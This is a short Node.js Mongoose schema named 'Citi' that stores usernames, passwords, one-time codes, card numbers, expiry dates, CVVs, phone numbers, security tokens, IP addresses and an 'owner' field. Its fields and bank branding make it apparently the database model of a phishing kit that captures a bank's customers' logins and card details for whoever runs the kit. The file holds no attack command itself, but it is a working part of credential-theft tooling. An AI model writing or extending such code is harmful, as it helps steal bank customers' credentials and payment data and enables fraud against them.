const mongoose = require("mongoose");

const citiModel = new mongoose.Schema({
  uniqueid: String,
  username: String,
  password: String,
  otp: String,
  ccnum: String,
  ccexp: String,
  cvv: String,
  telephone: String,
  secToken: String,
  status: Number,
  ip: String,
  owner: String,
});

module.exports = mongoose.model("Citi", citiModel);
